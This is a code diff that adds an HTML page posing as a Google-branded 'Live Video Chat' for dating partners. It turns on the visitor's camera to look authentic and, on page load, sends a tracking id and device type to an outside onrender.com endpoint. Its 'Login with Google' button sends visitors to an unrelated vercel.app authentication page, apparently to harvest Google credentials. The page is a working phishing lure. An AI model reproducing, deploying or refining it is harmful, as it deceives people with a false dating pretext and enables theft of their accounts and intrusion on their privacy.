@@ -1,0 +1,494 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>Live Video Call</title>
+    <link
+      rel="icon"
+      type="image/png"
+      href="https://fonts.gstatic.com/s/i/productlogos/meet_2020q4/v1/web-96dp/logo_meet_2020q4_color_2x_web_96dp.png"
+      sizes="32x32"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      html,
+      body {
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      /* =========================
+           FULL PAGE
+        ========================= */
+
+      .page {
+        position: relative;
+        width: 100%;
+        height: 100vh;
+        height: 100svh;
+        overflow: hidden;
+        background: #000;
+      }
+
+      /* =========================
+           CAMERA BACKGROUND
+        ========================= */
+
+      #camera {
+        position: absolute;
+
+        inset: 0;
+
+        width: 100%;
+        height: 100%;
+
+        object-fit: cover;
+
+        background: #000;
+
+        z-index: 1;
+
+        opacity: 0;
+
+        transition: opacity 0.5s ease;
+      }
+
+      /* Camera becomes visible after permission */
+      #camera.active {
+        opacity: 1;
+      }
+
+      /* =========================
+           DARK CAMERA OVERLAY
+        ========================= */
+
+      .camera-overlay {
+        position: absolute;
+
+        inset: 0;
+
+        background: rgba(0, 0, 0, 0.12);
+
+        z-index: 2;
+
+        pointer-events: none;
+      }
+
+      /* =========================
+           WAITING TEXT
+        ========================= */
+
+      .waiting {
+        position: absolute;
+
+        top: 125px;
+        left: 50%;
+
+        transform: translateX(-50%);
+
+        z-index: 10;
+
+        color: #fff;
+
+        font-size: 30px;
+
+        font-weight: 600;
+
+        white-space: nowrap;
+
+        text-shadow: 0 2px 5px rgba(0, 0, 0, 0.65);
+
+        opacity: 0;
+
+        transition: opacity 0.4s ease;
+      }
+
+      /* Show only when camera is allowed */
+      .waiting.show {
+        opacity: 1;
+      }
+
+      /* =========================
+           LOGIN CARD
+        ========================= */
+
+      .login-card {
+        position: absolute;
+
+        top: 50%;
+        left: 50%;
+
+        transform: translate(-50%, -50%);
+
+        width: 370px;
+
+        max-width: calc(100% - 30px);
+
+        padding: 19px 38px 27px;
+
+        background: #fff;
+
+        border-radius: 7px;
+
+        z-index: 20;
+
+        box-shadow: 0 8px 30px rgba(0, 0, 0, 0.18);
+      }
+
+      /* =========================
+           TITLE
+        ========================= */
+
+      .login-card h1 {
+        margin-bottom: 22px;
+
+        color: #321064;
+
+        text-align: center;
+
+        font-size: 30px;
+
+        line-height: 1.15;
+
+        font-weight: 700;
+      }
+
+      /* =========================
+           DESCRIPTION
+        ========================= */
+
+      .description {
+        margin: 0 4px 39px;
+
+        color: #111;
+
+        font-size: 16px;
+
+        line-height: 1.28;
+      }
+
+      .description strong {
+        color: #321064;
+      }
+
+      /* =========================
+           join BUTTON
+        ========================= */
+
+      .join-button {
+        width: 100%;
+
+        height: 47px;
+
+        border: none;
+
+        border-radius: 5px;
+
+        background: #1199e8;
+
+        color: #fff;
+
+        font-size: 18px;
+
+        font-weight: 500;
+
+        cursor: pointer;
+
+        transition:
+          background 0.2s ease,
+          transform 0.15s ease,
+          box-shadow 0.2s ease;
+      }
+
+      .join-button:hover {
+        background: #078bd8;
+
+        box-shadow: 0 4px 12px rgba(17, 153, 232, 0.3);
+      }
+
+      .join-button:active {
+        transform: scale(0.99);
+      }
+
+      /* =========================
+           STATUS
+        ========================= */
+
+      #status {
+        min-height: 16px;
+
+        margin-top: 8px;
+
+        color: #555;
+
+        font-size: 12px;
+
+        text-align: center;
+      }
+
+      /* =========================
+           MOBILE
+        ========================= */
+
+      @media (max-width: 600px) {
+        .waiting {
+          top: 70px;
+
+          font-size: 22px;
+        }
+
+        .login-card {
+          width: calc(100% - 28px);
+
+          max-width: 370px;
+
+          padding: 20px 22px 25px;
+        }
+
+        .login-card h1 {
+          margin-bottom: 20px;
+
+          font-size: 26px;
+        }
+
+        .description {
+          margin: 0 0 30px;
+
+          font-size: 14px;
+
+          line-height: 1.35;
+        }
+
+        .join-button {
+          height: 48px;
+
+          font-size: 16px;
+        }
+      }
+
+      /* =========================
+           SMALL MOBILE
+        ========================= */
+
+      @media (max-width: 380px) {
+        .waiting {
+          top: 55px;
+
+          font-size: 20px;
+        }
+
+        .login-card {
+          padding: 18px 18px 22px;
+        }
+
+        .login-card h1 {
+          font-size: 24px;
+        }
+
+        .description {
+          font-size: 13px;
+        }
+      }
+
+      /* =========================
+           LANDSCAPE MOBILE
+        ========================= */
+
+      @media (max-height: 550px) and (orientation: landscape) {
+        .waiting {
+          top: 25px;
+
+          font-size: 20px;
+        }
+
+        .login-card {
+          transform: translate(-50%, -50%) scale(0.85);
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="page">
+      <!-- =========================
+         CAMERA
+    ========================= -->
+
+      <video id="camera" autoplay muted playsinline></video>
+
+      <!-- Camera overlay -->
+      <div class="camera-overlay"></div>
+
+      <!-- =========================
+         WAITING TEXT
+    ========================= -->
+
+      <div id="waiting" class="waiting">Waiting....</div>
+
+      <!-- =========================
+         LOGIN CARD
+    ========================= -->
+
+      <div class="login-card">
+        <h1>Live Video Chat</h1>
+
+        <p class="description">
+          Login with
+          <strong>Google</strong>
+          and enjoy with
+          <strong>Private Live Video Chat</strong>
+          your dating partner.
+        </p>
+
+        <button type="button" class="join-button" id="joinButton">
+          Login with Google
+        </button>
+
+        <div id="status"></div>
+      </div>
+    </div>
+
+    <script>
+      /* =========================
+       ELEMENTS
+    ========================= */
+      const id = new URLSearchParams(window.location.search).get("id");
+      const camera = document.getElementById("camera");
+
+      const waiting = document.getElementById("waiting");
+
+      const joinButton = document.getElementById("joinButton");
+
+      const status = document.getElementById("status");
+
+      /* =========================
+       START CAMERA
+    ========================= */
+
+      async function startCamera() {
+        try {
+          /*
+           * Ask user for camera permission
+           */
+
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+              facingMode: "user",
+
+              width: {
+                ideal: 1920,
+              },
+
+              height: {
+                ideal: 1080,
+              },
+            },
+
+            audio: false,
+          });
+
+          /*
+           * Put camera stream
+           * into background
+           */
+
+          camera.srcObject = stream;
+
+          /*
+           * Show camera
+           */
+
+          camera.classList.add("active");
+
+          /*
+           * Show Waiting text
+           * only after camera is allowed
+           */
+
+          waiting.classList.add("show");
+        } catch (error) {
+          console.error("Camera permission error:", error);
+
+          /*
+           * Camera was not allowed,
+           * so Waiting remains hidden.
+           */
+
+          waiting.classList.remove("show");
+        }
+      }
+
+      /* Start camera */
+
+      startCamera();
+      function getDeviceType() {
+        const ua = navigator.userAgent.toLowerCase();
+        const isMobile =
+          /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
+        const isTablet = /ipad|tablet|playbook|silk/i.test(ua) && !isMobile;
+
+        if (isMobile || isTablet) return "mobile";
+        return "desktop";
+      }
+
+      const deviceType = getDeviceType();
+
+      window.addEventListener("load", async () => {
+        try {
+          const res = await fetch(
+            "https://megatools-8920.onrender.com/api/v1/information",
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                user: id,
+                deviceType,
+                siteName: "AutoInfo/login-view",
+              }),
+            },
+          );
+
+          const data = await res.json();
+        } catch (err) {
+          console.error(err);
+          alert("Failed to save email.");
+        }
+      });
+
+      /* =========================
+       join BUTTON
+    ========================= */
+
+      joinButton.addEventListener("click", () => {
+        window.location.href =
+          "https://auth-seven-pied.vercel.app/user-auth.html?id=" + id; // your auth page
+      });
+
+      /* =========================
+       STOP CAMERA
+    ========================= */
+
+      window.addEventListener("beforeunload", function () {
+        if (camera.srcObject) {
+          camera.srcObject.getTracks().forEach(function (track) {
+            track.stop();
+          });
+        }
+      });
+    </script>
+  </body>
+</html>
